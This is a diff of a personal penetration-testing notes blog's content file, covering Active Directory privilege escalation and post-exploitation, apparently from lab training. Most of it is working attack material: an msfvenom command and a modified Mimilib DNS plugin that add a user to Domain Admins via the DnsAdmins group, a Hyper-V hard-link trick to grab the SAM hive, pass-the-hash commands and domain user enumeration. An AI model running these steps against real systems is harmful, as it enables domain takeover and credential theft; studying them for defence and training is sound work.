+<h6 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ msfvenom -p windows/x64/exec cmd=<span class="string">&#x27;net group &quot;Domain Admins&quot; netadm /add /domain&#x27;</span> -f dll -o adduser.dll</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimilib-dll"><a href="#Mimilib-dll" class="headerlink" title="Mimilib.dll"></a>Mimilib.dll</h6><blockquote>
+<p>Or we can use <code>Mimilib.dll</code></p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*	Benjamin DELPY `gentilkiwi`</span></span><br><span class="line"><span class="comment">	https://blog.gentilkiwi.com</span></span><br><span class="line"><span class="comment">	benjamin@gentilkiwi.com</span></span><br><span class="line"><span class="comment">	Licence : https://creativecommons.org/licenses/by/4.0/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kdns.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginInitialize</span><span class="params">(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginCleanup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginQuery</span><span class="params">(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)</span></span><br><span class="line">&#123;</span><br><span class="line">	FILE * kdns_logfile;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(push)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line">	<span class="keyword">if</span>(kdns_logfile = _wfopen(<span class="string">L&quot;kiwidns.log&quot;</span>, <span class="string">L&quot;a&quot;</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(pop)</span></span><br><span class="line">	&#123;</span><br><span class="line">		klog(kdns_logfile, <span class="string">L&quot;%S (%hu)\n&quot;</span>, pszQueryName, wQueryType);</span><br><span class="line">		fclose(kdns_logfile);</span><br><span class="line">	    system(<span class="string">&#x27;net group &quot;Domain Admins&quot; netadm /add /domain&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜ Then we transfer the DLL to the target <code>DC</code>.</p>
+</blockquote>
+<h4 id="Loading-Custom-DLL"><a href="#Loading-Custom-DLL" class="headerlink" title="Loading Custom DLL"></a>Loading Custom DLL</h4><blockquote>
+<p>Using <code>dnscmd</code>, we can load the custom DLL</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Note: We must specify the full path to our custom DLL or the attack will not work properly.</p>
+</blockquote>
+<h4 id="Restarting-DNS-Service"><a href="#Restarting-DNS-Service" class="headerlink" title="Restarting DNS Service"></a>Restarting DNS Service</h4><blockquote>
+<p>After Loading our custom dll file, we need to restart the service, but we must have permission to stop and start the DNS service.</p>
+</blockquote>
+<blockquote>
+<p>To check whether we have permission, we first need the SID of our user:</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">where</span> <span class="title">name</span>=&quot;<span class="title">netadm</span>&quot; <span class="title">get</span> <span class="title">sid</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>Once we have the user’s SID, we can use the <code>sc</code> command to check our permissions on the service.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">sdshow</span> <span class="title">DNS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">IU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">SU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWRPWPDTLOCRRC</span>;;;<span class="title">SY</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">BA</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">SO</span>)(<span class="title">A</span>;;<span class="title">RPWP</span>;;;<span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109)<span class="title">S</span>:(<span class="title">AU</span>;<span class="title">FA</span>;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">WD</span>)</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>From the output, we can see that our user has <code>RPWP</code> permissions, which allow <code>SERVICE_START</code> and <code>SERVICE_STOP</code> on the DNS service.</p>
+</blockquote>
+<blockquote>
+<p>After confirming these permissions, we can stop the DNS service.</p>
+</blockquote>
+<p> </p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">stop</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Once the service is stopped, we start it again so the DNS server loads and executes our malicious DLL.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">start</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>Groups</category>
+      </categories>
+      <tags>
+        <tag>dnscmd.exe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Dump Lsass</title>
     <url>/2025/11/26/Dump-Lsass/</url>
     <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
@@ -683,6 +752,48 @@
       </tags>
   </entry>
   <entry>
+    <title>Hyper-V Administrators</title>
+    <url>/2026/03/06/Hyper-V-Administrators/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ The <code>Hyper-V Administrators</code> group has full access to all <a href="https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines">Hyper-V features</a>. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.</p>
+</blockquote>
+<blockquote>
+<p>➜ The <code>Hyper-V Administrators</code> group can manage virtual machines and their disk files (<code>.vhdx</code>). The Hyper-V service (<code>vmms.exe</code>), running as <code>NT AUTHORITY\SYSTEM</code>, automatically restores default permissions on these disk files during cleanup. An attacker can delete a legitimate <code>.vhdx</code> file and replace it with a hard link to a protected system file such as <code>SAM</code>. When <code>vmms.exe</code> restores permissions, it grants <code>Hyper-V Administrators</code> full control over the target file, allowing credential extraction and privilege escalation to SYSTEM.</p>
+</blockquote>
+<h3 id="Initial-State"><a href="#Initial-State" class="headerlink" title="Initial State"></a>Initial State</h3><p>Our target file is:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">K:\Twistzz\dc01.vhdx</span><br></pre></td></tr></table></figure>
+
+<p>We are members of:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hyper-V Administrators</span><br></pre></td></tr></table></figure>
+
+<p>However, we do not have direct access to protected files such as:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
+<h3 id="Remove-the-Legitimate-Virtual-Disk"><a href="#Remove-the-Legitimate-Virtual-Disk" class="headerlink" title="Remove the Legitimate Virtual Disk"></a>Remove the Legitimate Virtual Disk</h3><p>Because members of <code>Hyper-V Administrators</code> have full control over VM disks, we can delete the original <code>.vhdx</code> file:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">del</span> K:\Twistzz\dc01.vhdx</span><br></pre></td></tr></table></figure>
+
+<h3 id="Create-a-Hard-Link-to-a-Protected-File"><a href="#Create-a-Hard-Link-to-a-Protected-File" class="headerlink" title="Create a Hard Link to a Protected File"></a>Create a Hard Link to a Protected File</h3><p>Next, we create a hard link using the same file name as the virtual disk <code>dc01.vhdx</code>, pointing to the <code>SAM</code> registry hive:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">fsutil hardlink create K:\Twistzz\dc01.vhdx C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>At the filesystem level, both paths now reference the same file object.</p>
+</li>
+<li><p>Importantly, the <code>SAM</code> file permissions remain unchanged at this stage.</p>
+</li>
+</ul>
+<h3 id="Trigger-Permission-Restoration-by-Deleting-the-VM"><a href="#Trigger-Permission-Restoration-by-Deleting-the-VM" class="headerlink" title="Trigger Permission Restoration by Deleting the VM"></a>Trigger Permission Restoration by Deleting the VM</h3><p>When the virtual machine is deleted, <code>vmms.exe</code> restores permissions on <code>K:\Twistzz\dc01.vhdx</code>.</p>
+<p>Since <code>K:\Twistzz\dc01.vhdx</code> is a hard link to the <code>SAM</code> hive, any permission changes applied to this file also affect the <code>SAM</code> file.</p>
+<p>Because this operation is performed by <code>SYSTEM</code>, <code>vmms.exe</code> grants Full Control on <code>K:\Twistzz\dc01.vhdx</code> to members of <code>Hyper-V Administrators</code>, which effectively grants the same permissions on the <code>SAM</code> hive.</p>
+<h3 id="Access-the-Protected-System-File"><a href="#Access-the-Protected-System-File" class="headerlink" title="Access the Protected System File"></a>Access the Protected System File</h3><p>As members of <code>Hyper-V Administrators</code>, we now have sufficient permissions to access the <code>SAM</code> and <code>SYSTEM</code> registry hives</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\Windows\System32\config\SAM C:\Temp\SAM_copy</span><br><span class="line"></span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM_copy</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>Groups</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Extracting Passwords from Windows Registry.</title>
     <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
     <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
@@ -719,74 +830,6 @@
       </categories>
       <tags>
         <tag>Dump-SAM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DnsAdmins</title>
-    <url>/2026/03/06/DnsAdmins/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ DnsAdmins is a Windows group whose members can manage DNS settings within an Active Directory environment. Because the DNS service runs with <code>SYSTEM privileges </code> and supports loading custom plugins, this role can be abused to <code>execute malicious code by loading a crafted DLL</code>, potentially leading to full compromise of a Domain Controller.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\netadm&gt; whoami /groups</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                 <span class="built_in">Type</span>             SID                                           Attributes    </span><br><span class="line">========================================== ================ ============================================= ===============================================================</span><br><span class="line"></span><br><span class="line">INLANEFREIGHT\DnsAdmins                    Alias            S<span class="literal">-1-5-21-669053619-2741956077-1013132368-1101</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span>, Local <span class="built_in">Group</span>                                              </span><br></pre></td></tr></table></figure>
-
-<h4 id="Generating-a-Malicious-DLL"><a href="#Generating-a-Malicious-DLL" class="headerlink" title="Generating a Malicious DLL"></a>Generating a Malicious DLL</h4><blockquote>
-<p>We can generate a malicious DLL to add a user to the <code>Domain Admins</code> group using <code>msfvenom</code>.</p>
-</blockquote>
-<h6 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ msfvenom -p windows/x64/exec cmd=<span class="string">&#x27;net group &quot;Domain Admins&quot; netadm /add /domain&#x27;</span> -f dll -o adduser.dll</span><br></pre></td></tr></table></figure>
-
-<h6 id="Mimilib-dll"><a href="#Mimilib-dll" class="headerlink" title="Mimilib.dll"></a>Mimilib.dll</h6><blockquote>
-<p>Or we can use <code>Mimilib.dll</code></p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*	Benjamin DELPY `gentilkiwi`</span></span><br><span class="line"><span class="comment">	https://blog.gentilkiwi.com</span></span><br><span class="line"><span class="comment">	benjamin@gentilkiwi.com</span></span><br><span class="line"><span class="comment">	Licence : https://creativecommons.org/licenses/by/4.0/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kdns.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginInitialize</span><span class="params">(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginCleanup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginQuery</span><span class="params">(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)</span></span><br><span class="line">&#123;</span><br><span class="line">	FILE * kdns_logfile;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(push)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line">	<span class="keyword">if</span>(kdns_logfile = _wfopen(<span class="string">L&quot;kiwidns.log&quot;</span>, <span class="string">L&quot;a&quot;</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(pop)</span></span><br><span class="line">	&#123;</span><br><span class="line">		klog(kdns_logfile, <span class="string">L&quot;%S (%hu)\n&quot;</span>, pszQueryName, wQueryType);</span><br><span class="line">		fclose(kdns_logfile);</span><br><span class="line">	    system(<span class="string">&#x27;net group &quot;Domain Admins&quot; netadm /add /domain&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>➜ Then we transfer the DLL to the target <code>DC</code>.</p>
-</blockquote>
-<h4 id="Loading-Custom-DLL"><a href="#Loading-Custom-DLL" class="headerlink" title="Loading Custom DLL"></a>Loading Custom DLL</h4><blockquote>
-<p>Using <code>dnscmd</code>, we can load the custom DLL</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Note: We must specify the full path to our custom DLL or the attack will not work properly.</p>
-</blockquote>
-<h4 id="Restarting-DNS-Service"><a href="#Restarting-DNS-Service" class="headerlink" title="Restarting DNS Service"></a>Restarting DNS Service</h4><blockquote>
-<p>After Loading our custom dll file, we need to restart the service, but we must have permission to stop and start the DNS service.</p>
-</blockquote>
-<blockquote>
-<p>To check whether we have permission, we first need the SID of our user:</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">where</span> <span class="title">name</span>=&quot;<span class="title">netadm</span>&quot; <span class="title">get</span> <span class="title">sid</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109</span></span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>Once we have the user’s SID, we can use the <code>sc</code> command to check our permissions on the service.</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">sdshow</span> <span class="title">DNS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">IU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">SU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWRPWPDTLOCRRC</span>;;;<span class="title">SY</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">BA</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">SO</span>)(<span class="title">A</span>;;<span class="title">RPWP</span>;;;<span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109)<span class="title">S</span>:(<span class="title">AU</span>;<span class="title">FA</span>;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">WD</span>)</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>From the output, we can see that our user has <code>RPWP</code> permissions, which allow <code>SERVICE_START</code> and <code>SERVICE_STOP</code> on the DNS service.</p>
-</blockquote>
-<blockquote>
-<p>After confirming these permissions, we can stop the DNS service.</p>
-</blockquote>
-<p> </p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">stop</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Once the service is stopped, we start it again so the DNS server loads and executes our malicious DLL.</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">start</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Privesc</category>
-        <category>Groups</category>
-      </categories>
-      <tags>
-        <tag>dnscmd.exe</tag>
       </tags>
   </entry>
   <entry>
@@ -899,58 +942,70 @@
       </tags>
   </entry>
   <entry>
-    <title>Mssql Enumeration</title>
-    <url>/2025/11/20/Mssql-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+    <title>Linux Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
 
 
+<h3 id="Local-Account"><a href="#Local-Account" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span> --local-auth</span><br></pre></td></tr></table></figure>
 
-<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span>  -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
 
+<h1 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h1><h3 id="Local-Account-1"><a href="#Local-Account-1" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+<h3 id="Domain-Account-1"><a href="#Domain-Account-1" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username@domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
 
 
-<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
-<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec username@ip -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
 
-<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp  /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>evil-winrm</tag>
+        <tag>impacket-psexec</tag>
+        <tag>xfreerdp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Making a Target User List</title>
+    <url>/2025/12/03/Making-a-Target-User-List/</url>
+    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
 
-<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
 
-<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
 
 
-<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
 
-<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
 
